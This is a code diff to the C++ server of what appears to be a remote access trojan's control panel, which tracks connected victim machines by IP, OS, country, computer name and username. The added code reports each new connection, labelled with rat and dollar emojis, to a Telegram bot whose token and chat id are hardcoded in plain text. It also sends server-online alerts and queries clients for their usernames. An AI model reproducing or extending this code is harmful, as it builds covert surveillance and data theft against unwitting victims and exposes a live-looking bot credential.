@@ -1,9 +1,11 @@
-#include "server.h"
+﻿#include "server.h"
 #include "WndRegisters.h"
 #include "resources.h"
 #include "sockinitialize.h"
 #include "sys.h"
 #include "wndfuncs.h"
+#include "codepoints.h"
+#include "countrycoords.h"
 #include <set>
 #define MAX_DOTS 100
 
@@ -28,6 +30,7 @@ int itemIndex;
 std::wstring aCounter;
 std::wstring itemFileName;
 std::map<int, std::wstring> clientItems;
+std::set<std::wstring> connectedClients;
 
 typedef struct _DOT {
     int dotX;
@@ -160,13 +163,27 @@ int ListenOnPort(HWND hwnd, int portno)
                     newSd = accept(s, (sockaddr*)&newSockAddr, &sizenewSockAddr);
                     if (newSd > 0)
                     {
+                        char* ip = inet_ntoa(newSockAddr.sin_addr);
+                        size_t len = strlen(ip);
+                        wchar_t* wip = new wchar_t[len + 1];
+                        mbstowcs(wip, ip, len + 1);
+                        std::wstring wipStr(wip);
+
+                        auto add = connectedClients.insert(wipStr);
+                        if (!add.second)
+                        {
+                            // IP address already exists in the set, so close the connection
+                            //closesocket(newSd);
+                        }
+                        //add to else the rest of the code
+
                         OutputDebugStringW(L"\nAccepted!\n");
                         clientSockets.push_back(newSd);
                         std::string message = "Tato sprava bola poslana zo serveru.";
 
                         for (auto& sAll : clientSockets)
                         {
-                            
+
                             send(sAll, message.c_str(), message.size(), 0);
                         }
 
@@ -176,7 +193,7 @@ int ListenOnPort(HWND hwnd, int portno)
 
                         }
 
-                        SendMessageW(hwnd, WM_SOCKET, NULL, FD_READ);
+                        SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);
 
                     }
                     break;
@@ -198,6 +215,88 @@ void CloseConnection(void)
         closesocket(s);
 
     WSACleanup();
+}
+
+void TelegramServerStatus(boolean online)
+{
+    std::string response3;
+    std::string acPoint = "chat_id=-893691554&text=";
+    std::string txtmsg_chars;
+
+    if (online == true)
+    {
+        txtmsg_chars = acPoint + "[" + greendotEmoji + "]" + " SERVER ONLINE " + "[" + greendotEmoji + "]";
+    }
+    else if (online == false)
+    {
+        txtmsg_chars = acPoint + "[" + reddotEmoji + "]" + " SERVER CLOSED | OFFLINE " + "[" + reddotEmoji + "]";
+    }
+    
+    const char* txtmsg_char = txtmsg_chars.c_str();
+
+    CURLM* multiHandle4 = curl_multi_init();
+
+    // Create a list of easy handles to add to the multi handle
+    std::vector<CURL*> easyHandles;
+    CURL* curl4 = curl_easy_init();
+    if (curl4) {
+        curl_easy_setopt(curl4, CURLOPT_URL, "https://api.telegram.org/bot5781417296:AAEBpOKMGE_QDYsJu5nqQiXFXyWCU-fgDN0/sendMessage");
+        curl_easy_setopt(curl4, CURLOPT_POSTFIELDS, txtmsg_char);
+        curl_easy_setopt(curl4, CURLOPT_WRITEFUNCTION, writeFunction);
+        curl_easy_setopt(curl4, CURLOPT_WRITEDATA, &response3);
+
+        easyHandles.push_back(curl4);
+    }
+
+    // Add the easy handles to the multi handle
+    for (CURL* easyHandle : easyHandles) {
+        curl_multi_add_handle(multiHandle4, easyHandle);
+    }
+
+    // Perform the requests in a non-blocking manner
+    int stillRunning = 1;
+    while (stillRunning) {
+        curl_multi_perform(multiHandle4, &stillRunning);
+
+        // Check for completed transfers
+        int msgsInQueue;
+        CURLMsg* msg;
+        while ((msg = curl_multi_info_read(multiHandle4, &msgsInQueue))) {
+            if (msg->msg == CURLMSG_DONE) {
+                // Get the easy handle and response data for the completed transfer
+                CURL* easyHandle = msg->easy_handle;
+                char* response;
+                curl_easy_getinfo(easyHandle, CURLINFO_PRIVATE, &response);
+
+                // Handle the response as needed
+                if (msg->data.result == CURLE_OK) {
+                    // Handle successful response
+                    // ...
+
+                }
+                else {
+                    // Handle error response
+                    // ...
+                }
+
+                // Remove the easy handle from the multi handle and clean it up
+                curl_multi_remove_handle(multiHandle4, easyHandle);
+                curl_easy_cleanup(easyHandle);
+                free(response);
+            }
+        }
+
+        // Wait for activity on the handles using the multi handle timeout
+        int numFds;
+        int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
+        if (selectResult != CURLM_OK) {
+            // Handle error
+            // ...
+        }
+    }
+
+    // Clean up the multi handle
+    curl_multi_cleanup(multiHandle4);
 }
 
 std::wstring GetCurrentSocketFromVector()
@@ -250,6 +349,29 @@ ATOM CreateItem(HWND hwndList, wchar_t column_txt[])
     return ListView_InsertItem(hwndList, &lvi);
 }
 
+std::string pcUsername;
+
+void RequestUsername(HWND hwnd,int timerId)
+{
+    SOCKET selectedSocket = clientSockets[itemIndex];
+    auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
+    send(selectedSocket, "requsr", strlen("requsr"), 0);
+
+    SetTimer(hwnd, timerId, 100, NULL);
+}
+
+void TelegramInfo(HWND hwnd)
+{
+    SetTimer(hwnd, 1086, 1000, NULL);
+}
+
+std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
+std::string response2;
+std::string fIPStr;
+std::string response;
+wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
+std::wstring osVersion;
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     int bytesRec;
@@ -295,8 +417,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 int itemIndex = ListView_InsertItem(hwndList, &item);
                 clientItems.insert(std::make_pair(counter, thisItemName));
 
+                //OS
+                osVersion = getSysOpType();
+                ListView_SetItemText(hwndList, itemIndex, 2, const_cast<LPWSTR>(osVersion.c_str()));
+
                 //PC Name
-                wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
+                
                 DWORD size = sizeof(computerName) / sizeof(computerName[0]);
                 if (GetComputerNameW(computerName, &size)) {
                     std::wstring pcName = computerName;
@@ -306,69 +432,183 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                     // handle error
                 }
 
+                RequestUsername(hwnd,1091);
+                
+                fIPStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(wip);
 
-                std::string fIPStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(wip);
-                std::string url = "https://ipapi.co/"+fIPStr+"/country_name";
-                CURL* curl = curl_easy_init();
-                if (curl) {
-                    std::string response;
-                    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
-                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-                    CURLcode res = curl_easy_perform(curl);
-                    if (res == CURLE_OK) {
-                        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
-                        std::wstring responseW = converter.from_bytes(response);
-                        ListView_SetItemText(hwndList, itemIndex, 3, (LPWSTR)responseW.c_str());
+                CURLM* multiHandle = curl_multi_init();
 
-                    }
-                    else {
-                        std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
-                    }
-                    curl_easy_cleanup(curl);
-                }
+                // Create a CURL handle for each URL to fetch
+                CURL* curl1 = curl_easy_init();
+                std::string url1 = "https://ipapi.co/" + fIPStr + "/country_name";
+                std::string response1;
+                curl_easy_setopt(curl1, CURLOPT_URL, url1.c_str());
+                curl_easy_setopt(curl1, CURLOPT_WRITEFUNCTION, writeFunction);
+                curl_easy_setopt(curl1, CURLOPT_WRITEDATA, &response1);
+                curl_multi_add_handle(multiHandle, curl1);
 
                 CURL* curl2 = curl_easy_init();
-                if (curl2) {
-                    std::string response2;
-                    std::string url2 = "https://ipapi.co/" + fIPStr + "/country_code";
-                    curl_easy_setopt(curl2, CURLOPT_URL, url2.c_str());
-                    curl_easy_setopt(curl2, CURLOPT_WRITEFUNCTION, writeFunction);
-                    curl_easy_setopt(curl2, CURLOPT_WRITEDATA, &response2);
-                    CURLcode res2 = curl_easy_perform(curl2);
-                    if (res2 == CURLE_OK) {
-                        for (int i = 0; i < clientSockets.size(); i++) {
-                            clientToDotMap[clientSockets[i]] = i;
+                std::string url2 = "https://ipapi.co/" + fIPStr + "/country_code";
+                std::string response2;
+                curl_easy_setopt(curl2, CURLOPT_URL, url2.c_str());
+                curl_easy_setopt(curl2, CURLOPT_WRITEFUNCTION, writeFunction);
+                curl_easy_setopt(curl2, CURLOPT_WRITEDATA, &response2);
+                curl_multi_add_handle(multiHandle, curl2);
+
+                // Process the requests
+                int runningHandles = 0;
+                do {
+                    curl_multi_perform(multiHandle, &runningHandles);
+
+                    int numMessages = 0;
+                    CURLMsg* message;
+                    while ((message = curl_multi_info_read(multiHandle, &numMessages))) {
+                        if (message->msg == CURLMSG_DONE) {
+                            CURL* curl = message->easy_handle;
+                            CURLcode res = message->data.result;
+                            if (res == CURLE_OK) {
+                                if (curl == curl1) {
+                                    std::wstring responseW = converter.from_bytes(response1);
+                                    ListView_SetItemText(hwndList, itemIndex, 3, (LPWSTR)responseW.c_str());
+                                }
+                                else if (curl == curl2) {
+                                    for (int i = 0; i < clientSockets.size(); i++) {
+                                        clientToDotMap[clientSockets[i]] = i;
+                                    }
+                                    std::map<std::string, Coordinates> countryCoords;
+                                    Country country;
+                                    srand(time(0));
+                                    countryCoords["SK"] = { country.SKx, country.SKy };
+                                    countryCoords["US"] = { country.USx, country.USy };
+                                    countryCoords["CZ"] = { country.CZx, country.CZy };
+                                    countryCoords["Undefined"] = { country.CNx, country.CNy };
+                                    auto coords = countryCoords[response2];
+                                    DOT newDot;
+
+                                    newDot.dotX = coords.x;
+                                    newDot.dotY = coords.y;
+                                    newDot.dotRadius = 4;
+
+                                    // Add the new dot to the dots array
+                                    dots[numDots] = newDot;
+                                    numDots++;
+
+                                    // Redraw the window to display the new dot
+                                    InvalidateRect(hwnd, NULL, TRUE);
+                                }
+                            }
+                            else {
+                                std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
+                            }
+                            curl_multi_remove_handle(multiHandle, curl);
+                            curl_easy_cleanup(curl);
                         }
-                        std::map<std::string, Coordinates> countryCoords;
-                        srand(time(0));
-                        countryCoords["SK"] = { rand() % (294 - 292 + 1) + 292, rand() % (506 - 502 + 1) + 502 };
-                        countryCoords["US"] = { rand() % (135 - 115 + 1) + 115, rand() % (535 - 505 + 1) + 505 };
-                        auto coords = countryCoords[response2];
-                        DOT newDot;
-
-                        newDot.dotX = coords.x;
-                        newDot.dotY = coords.y;
-                        newDot.dotRadius = 4;
-
-                        // Add the new dot to the dots array
-                        dots[numDots] = newDot;
-                        numDots++;
-
-                        // Redraw the window to display the new dot
-                        InvalidateRect(hwnd, NULL, TRUE);
                     }
-                    else {
-                        std::cerr << "cURL error: " << curl_easy_strerror(res2) << std::endl;
-                    }
-                    curl_easy_cleanup(curl2);
+                } while (runningHandles > 0);
+
+                // Cleanup
+                curl_multi_cleanup(multiHandle);
+
+                CURL* curl3;
+                CURLcode res;
+                std::string response3;
+                std::string OSstr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(osVersion);
+                std::string pcNameStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(computerName);
+
+                if (response2 == "CZ")
+                {
+                    flagEmoji = u8"\U0001F1E8\U0001F1FF";
+                }
+                if (response2 == "Undefined")
+                {
+                    flagEmoji = u8"\U0001F3F4";
                 }
 
 
-                //OS
-                std::wstring osVersion = getSysOpType();
-                ListView_SetItemText(hwndList, itemIndex, 2, const_cast<LPWSTR>(osVersion.c_str()));
- 
+                std::string userCount = " : " + std::to_string(counter) + "\n";
+                std::string ipPrint = " IP ADDRESS : " + fIPStr + "\n";
+                std::string osPrint = " OPERATION SYSTEM : " + OSstr + "\n";
+                std::string countryPrint = " COUNTRY : " + response1 + "\n";
+                std::string pcnamePrint = " COMPUTER NAME : " + pcNameStr + "\n";
+                std::string txtmsg = "chat_id=" + chat_id + "&text=" +
+                    ratEmoji + " " + dollarEmoji + " " + resulttitle() + " " + dollarEmoji + " " + ratEmoji + "\n" +
+                    greendotEmoji + " CONNECTED " + greendotEmoji + "\n" +
+                    IDemoji + userCount +
+                    IPemoji + ipPrint +
+                    OSemoji + osPrint +
+                    flagEmoji + countryPrint +
+                    pcnameEmoji + pcnamePrint;
+
+                const char* txtmsg_char = txtmsg.c_str();
+
+                CURLM* multiHandle4 = curl_multi_init();
+
+                // Create a list of easy handles to add to the multi handle
+                std::vector<CURL*> easyHandles;
+                CURL* curl4 = curl_easy_init();
+                if (curl4) {
+                    curl_easy_setopt(curl4, CURLOPT_URL, "https://api.telegram.org/bot5781417296:AAEBpOKMGE_QDYsJu5nqQiXFXyWCU-fgDN0/sendMessage");
+                    curl_easy_setopt(curl4, CURLOPT_POSTFIELDS, txtmsg_char);
+                    curl_easy_setopt(curl4, CURLOPT_WRITEFUNCTION, writeFunction);
+                    curl_easy_setopt(curl4, CURLOPT_WRITEDATA, &response3);
+
+                    easyHandles.push_back(curl4);
+                }
+
+                // Add the easy handles to the multi handle
+                for (CURL* easyHandle : easyHandles) {
+                    curl_multi_add_handle(multiHandle4, easyHandle);
+                }
+
+                // Perform the requests in a non-blocking manner
+                int stillRunning = 1;
+                while (stillRunning) {
+                    curl_multi_perform(multiHandle4, &stillRunning);
+
+                    // Check for completed transfers
+                    int msgsInQueue;
+                    CURLMsg* msg;
+                    while ((msg = curl_multi_info_read(multiHandle4, &msgsInQueue))) {
+                        if (msg->msg == CURLMSG_DONE) {
+                            // Get the easy handle and response data for the completed transfer
+                            CURL* easyHandle = msg->easy_handle;
+                            char* response;
+                            curl_easy_getinfo(easyHandle, CURLINFO_PRIVATE, &response);
+
+                            // Handle the response as needed
+                            if (msg->data.result == CURLE_OK) {
+                                // Handle successful response
+                                // ...
+
+                            }
+                            else {
+                                // Handle error response
+                                // ...
+                            }
+
+                            // Remove the easy handle from the multi handle and clean it up
+                            curl_multi_remove_handle(multiHandle4, easyHandle);
+                            curl_easy_cleanup(easyHandle);
+                            free(response);
+                        }
+                    }
+
+                    // Wait for activity on the handles using the multi handle timeout
+                    int numFds;
+                    int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
+                    if (selectResult != CURLM_OK) {
+                        // Handle error
+                        // ...
+                    }
+                }
+
+                // Clean up the multi handle
+                curl_multi_cleanup(multiHandle4);
+
+                
+
+                SetTimer(hwnd, 1087, 500, NULL);
+
 
                 if (itemIndex != -1)
                 {
@@ -385,7 +625,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
             SetTimer(hwnd, 12, 1000, NULL);
 
-            SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);
+            //SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);
 
             break;
         }
@@ -433,8 +673,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                         clientToDotMap.erase(dotIndex);
                     }
 
-                    addedClients.erase(*it); // Remove the client from the addedClients set
-                    it = clientSockets.erase(it); // Remove the client from the clientSockets vector
+                addedClients.erase(*it); // Remove the client from the addedClients set
+                closesocket(*it);
+                it = clientSockets.erase(it); // Remove the client from the clientSockets vector
+
                 }
                 else
                 {
@@ -443,6 +685,51 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 }
             
             }
+        }
+        if (wParam == 1091)
+        {
+            SOCKET selectedSocket = clientSockets[itemIndex];
+            char buffer[1024];
+            int bytesReceived = recv(selectedSocket, buffer, sizeof(buffer), 0);
+            if (bytesReceived > 0)
+            {
+                // Handle successful receive
+                std::string usernameStr(buffer, buffer + bytesReceived);
+                pcUsername = usernameStr;
+                
+                //MessageBoxW(NULL, usrName.c_str(), L"s", MB_OK);
+                KillTimer(hwnd, 1091);
+            }
+            else if (bytesReceived == 0 || (bytesReceived == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET))
+            {
+                // Handle socket error or disconnection
+                KillTimer(hwnd, 1091);
+            }
+        }
+
+        if (wParam == 1087)
+        {
+            std::wstring usrName = converter.from_bytes(pcUsername);
+            ListView_SetItemText(hwndList, itemIndex, 4, (LPWSTR)usrName.c_str());
+            KillTimer(hwnd, 1);
+        }
+
+
+        if (wParam == 1069)
+        {
+            for (int i = 0; i < numDots; i++) {
+                // Update the size of the dots
+                if (dots[i].dotRadius > 4) {
+                    dots[i].dotRadius--;
+                }
+                else {
+                    dots[i].dotRadius++;
+                }
+            }
+
+            // Redraw the window
+            InvalidateRect(hwnd, NULL, TRUE);
+            UpdateWindow(hwnd);
         }
         break;
     }
@@ -459,9 +746,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         CreateColumn(hwndList, 25, 130, (wchar_t*)L"PC Name");
         CreateColumn(hwndList, 25, 100, (wchar_t*)L"Operation Sys");
         CreateColumn(hwndList, 25, 100, (wchar_t*)L"Country");
+        CreateColumn(hwndList, 25, 130, (wchar_t*)L"User");
         SendMessageW(hwndList, LVM_SETBKCOLOR, 0, (LPARAM)clrRed);
 
         timerId = SetTimer(hwnd, 12, 1000, NULL);
+        SetTimer(hwnd, 1069, 200, NULL);
 
         OnCreate(hwnd,wParam,lParam);
         break;
@@ -732,15 +1021,20 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         break;
 
     case WM_CLOSE:
+    {
+        TelegramServerStatus(false);
         DestroyWindow(hwnd);
         CloseConnection();
         ExitProcess(0);
         break;
+    }
 
     case WM_DESTROY:
+    {
         CloseConnection();
         ExitProcess(0);
         break;
+    }
     
     default:
         return DefWindowProc(hwnd, msg, wParam, lParam);
@@ -859,7 +1153,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
             {
                 SOCKET selectedSocket = clientSockets[itemIndex];
                 auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-                send(selectedSocket, "requsr", strlen("requsr"), 0);
+                //send(selectedSocket, "requsr", strlen("requsr"), 0);
 
                 Sleep(500);
                 TCHAR clientUsername[260 + 1];
@@ -1058,11 +1352,13 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
 
     case WM_CLOSE:
     {
+        KillTimer(Chwnd, SCREEN_TIMER);
         DestroyWindow(hwndClient);
         break;
     }
 
     case WM_DESTROY:
+        KillTimer(Chwnd, SCREEN_TIMER);
         DestroyWindow(hwndClient);
         return 0;
 
@@ -1078,6 +1374,9 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPWSTR lpCmdLine, int nCmdShow)
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+
+    TelegramServerStatus(true);
+
     WNDCLASSEX wc;
     HWND hwnd;
     MSG Msg;
